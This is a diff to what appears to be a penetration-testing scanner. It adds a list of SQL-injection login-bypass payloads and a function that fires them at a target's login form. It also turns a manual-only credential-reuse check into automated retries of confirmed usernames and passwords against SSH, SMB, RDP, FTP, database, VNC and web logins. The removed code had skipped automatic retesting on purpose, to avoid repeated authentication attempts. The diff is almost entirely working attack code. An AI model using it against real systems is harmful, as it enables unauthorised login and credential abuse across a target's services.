@@ -231,6 +231,82 @@ def attempt_default_credentials(login_url, report=None):
     return None
 
 
+SQLI_AUTH_BYPASS_PAYLOADS = [
+    "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1-- -", "' OR 1=1#",
+    "admin'--", "admin' #", "admin'/*", "' OR 'a'='a", '" OR "1"="1',
+    "') OR ('1'='1", "') OR ('1'='1'-- ", "1' OR '1' = '1",
+]
+
+
+def attempt_sql_login_bypass(login_url, report=None):
+    """Classic ' OR '1'='1-style authentication-bypass payloads against a
+    login form's username/password fields - no password guessing, just
+    breaking the SQL logic behind the check. Same success heuristic as
+    attempt_default_credentials (redirect/content-length change with no
+    failure wording)."""
+    resp = _get(login_url, allow_redirects=True)
+    if not resp:
+        return None
+    form = _extract_login_form(resp.text, login_url)
+    if not form:
+        return None
+
+    baseline_len = len(resp.text or "")
+    session = requests.Session()
+    session.verify = False
+    failure_indicators = ["invalid", "incorrect", "failed", "error", "denied", "try again"]
+
+    for payload_str in SQLI_AUTH_BYPASS_PAYLOADS:
+        for target_both in (False, True):
+            payload = dict(form["extra_fields"])
+            payload[form["user_field"]] = payload_str
+            payload[form["pass_field"]] = payload_str if target_both else "x"
+            try:
+                if form["method"] == "post":
+                    attempt = session.post(form["action"], data=payload, timeout=6,
+                                            allow_redirects=True, verify=False)
+                else:
+                    attempt = session.get(form["action"], params=payload, timeout=6,
+                                           allow_redirects=True, verify=False)
+            except requests.RequestException:
+                continue
+
+            attempt_body = (attempt.text or "").lower()
+            looks_like_failure = any(ind in attempt_body for ind in failure_indicators)
+            sql_error = any(re.search(pattern, attempt.text or "", re.IGNORECASE)
+                             for pattern in SQL_ERROR_SIGNATURES)
+            length_changed = abs(len(attempt.text or "") - baseline_len) > 200
+            redirected_away = attempt.url != login_url and attempt.history
+
+            if sql_error and report:
+                report.add_finding(
+                    "Web Application Analysis",
+                    f"Login form raises a SQL error under injection: {payload_str}",
+                    f"Field(s) likely concatenated directly into a query at {login_url} - "
+                    "worth testing further with sqlmap against this form", "HIGH",
+                    vuln_id="sql_injection_suspected",
+                )
+
+            if (length_changed or redirected_away) and not looks_like_failure and not sql_error:
+                if report:
+                    report.add_finding(
+                        "Web Application Analysis",
+                        f"SQL injection authentication bypass succeeded: {payload_str}",
+                        f"Login at {login_url} accepted a malformed boolean-logic payload in "
+                        "place of real credentials, suggesting the query is built with "
+                        "unsanitized string concatenation (e.g. "
+                        "\"SELECT * FROM users WHERE user='$u' AND pass='$p'\")", "CRITICAL",
+                        vuln_id="sql_injection_suspected",
+                    )
+                return {"payload": payload_str, "url": login_url, "method": "sqli_auth_bypass"}
+
+    if report:
+        report.add_finding("Web Application Analysis", "No SQL injection authentication bypass succeeded",
+                            f"Tried {len(SQLI_AUTH_BYPASS_PAYLOADS)} boolean-logic payload(s) against {login_url}",
+                            "INFO")
+    return None
+
+
 def check_basic_digest_auth(base_url, report=None):
     resp = _get(base_url)
     if not resp:
@@ -795,22 +871,41 @@ def validate_credentials(login_url, username, password, report=None):
     return success
 
 
-def check_credential_reuse(confirmed_creds, services, report=None):
+def check_credential_reuse(target, confirmed_creds, open_ports, report=None, other_login_urls=None):
+    """Actively retry already-confirmed credentials against every other
+    open network service and discovered web login form. `open_ports` is
+    the list returned by port_scanner.scan; `confirmed_creds` is a list
+    of (username, password) tuples already proven to work somewhere."""
+    from modules import bruteforce
+
+    port_to_service = {21: "ftp", 22: "ssh", 445: "smb", 3389: "rdp",
+                        3306: "mysql", 5432: "postgres", 6379: "redis",
+                        27017: "mongodb", 23: "telnet", 5900: "vnc", 1433: "mssql"}
+    standard_port = {21, 22, 445, 3389}
+
     results = []
+    if not confirmed_creds:
+        return results
+
+    services_present = {port_to_service[p["port"]]: p["port"]
+                         for p in (open_ports or []) if p["port"] in port_to_service}
+
     for username, password in confirmed_creds:
-        for service in services:
-            results.append({"service": service, "username": username, "password": password,
-                             "note": "Manual verification required - automated cross-service "
-                                     "retesting is not performed automatically to avoid "
-                                     "unnecessary repeated authentication attempts."})
-    if report and results:
-        report.add_finding(
-            "Web Application Analysis",
-            f"Credential reuse candidates identified for {len(services)} other service(s)",
-            "Confirmed credentials from one service should be manually tested against "
-            "other discovered services in scope (FTP, SSH, other web panels, etc.)",
-            "INFO",
-        )
+        for service, port in services_present.items():
+            try:
+                success = bruteforce.try_single_credential(
+                    service, target, username, password,
+                    port=None if port in standard_port else port, report=report)
+            except Exception:
+                success = None
+            if success:
+                results.append({"service": service, "username": username, "password": password})
+
+        for login_url in (other_login_urls or []):
+            success = validate_credentials(login_url, username, password, report=report)
+            if success:
+                results.append({"service": login_url, "username": username, "password": password})
+
     return results
 
 
